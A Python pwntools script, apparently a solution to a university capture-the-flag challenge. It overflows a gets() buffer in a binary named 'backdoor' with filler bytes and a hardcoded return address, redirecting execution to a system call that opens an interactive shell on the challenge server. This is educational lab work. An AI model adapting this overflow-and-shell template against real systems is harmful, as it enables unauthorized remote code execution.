'''
The program utilizes gets... so yeah...
In order to access the shell, the system call is hijacked from the get_time()
function
'''

from pwn import *
from time import sleep

localsize = 32 #size of local variable array from analysis
netid = "tk1931"
url = "offsec-chalbroker.osiris.cyber.nyu.edu"
port = 1339
localfile = './backdoor'

isRemote = True

if isRemote == False :
    # for the local machine
    sh = process(localfile)
    
    # load the ELF file (local machine only...)
    e = ELF(localfile)

    # attach debugger for local machine
    gdb.attach(sh, "break *0x004006c3\ncontinue")
    sleep(2) # wait for debugger
else :
    # for the remote machine
    sh = remote(url, port)

    # Pass NetID to the remote server
    print(sh.recvuntil(': ')) # wait to ask for NetID
    sh.sendline(netid) # give it the NetID
    print(netid)
    openner = sh.recvline() # wait until accepted


# wait for the first line
openner = sh.recvline()
print(openner)

garbage = "A" * (localsize - 1) + '\0' # garbage string to fill up locals
bpfiller = "A" * 8 # (word size)
attackString = garbage + bpfiller + p64(0x004006bb)

sh.sendline(attackString)
print(attackString)
print(sh.recvline())

# the shell should be open and ready to accept arguments
sh.interactive()

